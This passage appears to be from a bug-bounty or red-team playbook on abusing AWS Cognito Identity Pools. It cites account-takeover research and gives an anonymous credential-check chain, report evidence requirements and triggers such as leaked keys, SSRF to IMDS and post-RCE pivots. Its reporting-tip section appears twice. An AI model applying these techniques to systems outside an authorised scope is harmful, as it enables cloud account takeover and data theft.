5. **Spaceraccoon / Eugene Lim — "Mass Account Takeover via Cognito IdentityPool" (Medium, 2020)** — SaaS provider exposed IdentityPoolId in Amplify config; unauth role had `cognito-idp:AdminConfirmSignUp` + `AdminUpdateUserAttributes` on the linked User Pool — silent confirmation of any signup + email change = mass ATO.
6. **Datadog Security Labs — "Following AWS Logs Backwards: Cognito Identity Pool Abuse" (2024)** — telemetry across Datadog customer base showing real-world Cognito pool abuse. Non-trivial percentage of pools paired with policies broader than the minimum required. [securitylabs.datadoghq.com](https://securitylabs.datadoghq.com/articles/abusing-aws-cognito-misconfigurations/)

### Reporting tip

Always include in the report:
- `sts get-caller-identity` output (proves the role ARN + account ID)
- Pacu `iam__enum_permissions` JSON output (proves the granted actions)
- A concrete data-pull PoC (one sample S3 object listing, one DynamoDB record with PII redacted)

Without all three, triagers downgrade to Medium. The 60-second test is `GetId → GetCredentialsForIdentity → sts get-caller-identity`. If you reach step 3 anonymously, you have a finding.

Cross-reference: `cloud-misconfig` → `CloudWatch RUM weaponization` covers the specific RUM-embedded variant of this attack class.

---

### When to use

Trigger when:
- A cloud credential surfaces (key, secret, token, JSON file)
- SSRF chain reaches IMDS / metadata endpoint
- APK / git-leak reveals embedded cloud key
- Recon shows public S3/GCS/Azure-blob with permissions you can verify
- A Kubernetes API or service-account token is exposed
- Post-RCE on a cloud-hosted instance — pivot to cloud control plane

Do NOT use for:
- On-prem-only environments (use AD attack skills — but those are out of scope per external-only boundary)
- Web2 vulns that happen to be on AWS — use the relevant `hunt-*` skill

---

### Bridge to neighboring skills

- `hunt-cloud-misconfig` — finds the credentials in the first place (public buckets, IMDS via SSRF, leaked JSON)
- `hunt-ssrf` — SSRF→IMDS is the canonical chain into cloud control plane
- `apk-redteam-pipeline` — APK secret extraction commonly yields cloud creds
- `supply-chain-attack-recon` — CI/CD pipelines store cloud creds; finding them is a separate workflow
- `m365-entra-attack` — Azure cross-product; Managed Identity tokens cross over to Graph
- `mid-engagement-ir-detection` — cloud control plane activity is monitored; expect mitigations

---

### Reporting tip

Always include in the report:
- `sts get-caller-identity` output (proves the role ARN + account ID)
- Pacu `iam__enum_permissions` JSON output (proves the granted actions)
- A concrete data-pull PoC (one sample S3 object listing, one DynamoDB record with PII redacted)

Without all three, triagers downgrade to Medium. The 60-second test is `GetId → GetCredentialsForIdentity → sts get-caller-identity`. If you reach step 3 anonymously, you have a finding.

Cross-reference: `hunt-cloud-misconfig` → `CloudWatch RUM weaponization` covers the specific RUM-embedded variant of this attack class.

---
